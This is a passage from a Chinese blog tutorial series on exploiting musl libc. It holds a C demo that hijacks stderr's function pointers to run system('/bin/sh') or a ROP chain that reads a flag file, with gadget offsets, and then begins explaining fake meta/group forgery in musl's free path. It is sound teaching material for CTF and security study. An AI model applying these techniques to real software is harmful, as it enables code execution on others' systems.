1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> orw 2</span></span><br><span class="line"><span class="comment">// 重要！在这里修改利用模式</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode orw</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span>* bin_sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> enough_space[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">0x40</span>];</span><br><span class="line"><span class="type">char</span> flag_content[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc的FSOP利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;与glibc相似，FSOP也是musl的一种重要的利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是musl libc中FILE结构体的定义：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/internal/stdio_impl.h, line 21)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned flags;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *rpos, *rend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mint (*close)(FILE *);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wend, *wpos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *mustbezero_1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *wbase;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*read)(FILE *, unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31msize_t (*write)(FILE *, const unsigned char *, size_t);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31moff_t (*seek)(FILE *, off_t, int);\n&quot;</span> <span class="string">&quot;\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tsize_t buf_size;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev, *next;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint fd;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint pipe_pid;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tlong lockcount;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvolatile int lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint lbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *cookie;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t off;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tchar *getln_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tvoid *mustbezero_2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tunsigned char *shend;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\toff_t shlim, shcnt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *prev_locked, *next_locked;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct __locale_struct *locale;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;用红色标出的4行表示4个函数指针，这是我们利用的关键。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;又注意到exit函数有调用链：exit-&gt;__stdio_exit-&gt;close_file。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 16)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void __stdio_exit(void)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFILE *f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdin_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stdout_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tclose_file(__stderr_used);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/stdio/__stdio_exit.c, line 8)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static void close_file(FILE *f)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (!f) return;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tFFINALLOCK(f);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到3个标准IO的FILE结构体都可能会调用write和seek函数。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果能够修改这些函数指针的值，就能够执行任意代码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此无论如何，首先要做的就是获取libc的基地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们就利用stderr标准错误FILE结构体的地址来获取。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = (<span class="type">size_t</span>)<span class="built_in">stderr</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, stderr_addr);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;stderr在libc中的偏移量为0xAD080。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = stderr_addr - <span class="number">0xAD080</span>;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;计算得到libc的基地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\n\033[0m&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == get_shell)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了get shell模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在get shell模式中，我们需要修改stderr的3处内容：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 开头，需修改为字符串\&quot;/bin/sh\&quot;。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wpos或wbase，使得这两个值不等即可。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为system的地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意调用write函数时，第一个参数是FILE结构体地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此需要在FILE开头写字符串，从而get shell。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;system的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%#zx\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">strcpy</span>((<span class="type">char</span>*)stderr_addr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))system_addr;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == orw)&#123;</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;你选择了orw模式。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;orw的利用方式较get shell要复杂一些。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;但对于stderr而言还是只需要修改3个地方：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;1. 偏移0x30处，修改为修改为新栈的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;2. wbase，偏移0x38，修改为第一个gadget的地址。\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;3. write函数指针，修改为栈迁移的gadget的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;在偏移0x789F5处有这样一个gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(RED, HIGHLIGHT, <span class="string">&quot;0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;考虑到write函数调用的第一个参数为stderr地址，rdi=stderr地址。\n&quot;</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;按照上面的方案修改stderr，可以完美实现栈迁移。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;准备伪造栈的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> pivot_gadget = libc_base + <span class="number">0x789F5</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdi = libc_base + <span class="number">0x152A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rsi = libc_base + <span class="number">0x1B0A1</span>;</span><br><span class="line">        <span class="type">size_t</span> pop_rdx = libc_base + <span class="number">0x2A50B</span>;</span><br><span class="line"></span><br><span class="line">        ((FILE*)stderr_addr)-&gt;mustbezero_1 = (<span class="type">unsigned</span> <span class="type">char</span>*)fake_stack;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;wbase = (<span class="type">unsigned</span> <span class="type">char</span>*)pop_rdi;</span><br><span class="line">        ((FILE*)stderr_addr)-&gt;write = (<span class="type">size_t</span> (*)(FILE*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">size_t</span>))pivot_gadget;</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;调教完成的stderr：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)stderr_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;一些有用的gadget：\n&quot;</span>);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rsi ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rsi);</span><br><span class="line">        printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;pop rdx ; ret : &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\033[0m&quot;</span>, pop_rdx);</span><br><span class="line"></span><br><span class="line">        fake_stack[<span class="number">0</span>] = (<span class="type">size_t</span>)flag;   <span class="comment">// open函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">1</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// open函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">3</span>] = (<span class="type">size_t</span>)open;   <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">4</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">5</span>] = <span class="number">3</span>;              <span class="comment">// read函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">6</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">7</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// read函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">8</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">9</span>] = <span class="number">0x20</span>;           <span class="comment">// read函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">10</span>] = (<span class="type">size_t</span>)read;  <span class="comment">// 调用open</span></span><br><span class="line">        fake_stack[<span class="number">11</span>] = pop_rdi;</span><br><span class="line">        fake_stack[<span class="number">12</span>] = <span class="number">1</span>;             <span class="comment">// write函数参数1</span></span><br><span class="line">        fake_stack[<span class="number">13</span>] = pop_rsi;</span><br><span class="line">        fake_stack[<span class="number">14</span>] = (<span class="type">size_t</span>) flag_content;  <span class="comment">// write函数参数2</span></span><br><span class="line">        fake_stack[<span class="number">15</span>] = (<span class="type">size_t</span>) pop_rdx;</span><br><span class="line">        fake_stack[<span class="number">16</span>] = <span class="number">0x20</span>;          <span class="comment">// write函数参数3</span></span><br><span class="line">        fake_stack[<span class="number">17</span>] = (<span class="type">size_t</span>)write; <span class="comment">// 调用write</span></span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;新栈内容：\n&quot;</span>);</span><br><span class="line">        print_binary((<span class="type">char</span>*)fake_stack, <span class="number">20</span> * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后只需要调用exit函数即可。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，在musl libc中FSOP的方法有很多，这里只是演示了其中一种。更多的利用方式还是需要通过多看多做来掌握。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">musl pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:40:46" itemprop="dateCreated datePublished" datetime="2023-02-28T22:40:46+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。</p>
<p>musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的<code>group</code>和<code>meta</code>，因此除了构造假chunk外，还需要构造假<code>group</code>和假<code>meta</code>。如果在假<code>meta</code>中合理构造<code>prev</code>和<code>next</code>指针，在<code>nontrivial_free</code>中调用<code>dequeue</code>函数就可以实现这两个地址互相写。</p>
<p>但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。</p>
<p>在<code>free</code>中会调用<code>nontrivial_free</code>，<code>free</code>中调用的<code>get_meta</code>函数中有一些检查项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>meta-&gt;mem == base，即meta中保存的group指针要正确。</li>
<li>index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。</li>
<li>area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。</li>
<li>offset &gt;= size_classes[meta-&gt;sizeclass]*index</li>
<li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。</li>
<li>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。</li>
</ol>
<p>如果伪造的<code>meta</code>位于一个伪造的<code>meta_area</code>中，需要首先获取校验值<code>secret</code>并保存到<code>meta_area</code>开头，即这一页最开始的地方。</p>
<p>通过这个函数的检查之后，<code>nontrivial_free</code>的分支语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要求<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>，因此要合理设置<code>meta</code>的两个<code>mask</code>的值。</p>
<p>之后调用了<code>free_group</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> 